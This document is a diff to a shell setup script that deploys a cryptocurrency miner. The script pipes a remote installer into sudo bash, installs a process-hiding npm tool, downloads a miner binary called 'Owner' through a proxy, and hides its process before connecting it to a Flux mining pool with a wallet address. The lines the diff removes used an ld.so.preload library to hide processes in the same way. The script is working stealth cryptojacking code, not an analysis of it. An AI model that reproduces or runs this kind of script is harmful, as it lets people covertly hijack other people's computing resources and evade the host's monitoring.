@@ -1,4 +1,9 @@
 #!/bin/sh
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -38,11 +43,6 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Owner
 chmod +x Owner
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicOwner.zip
-unzip magicOwner.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+ph add Owner
 
-./graftcp/graftcp ./Owner -uri equihash1445+ssl://t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Owner@flux.herominers.com:1200 -pers ZelProof -share-check 300
+./Owner -uri equihash1445+ssl://t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Owner@flux.herominers.com:1200 -pers ZelProof -share-check 300
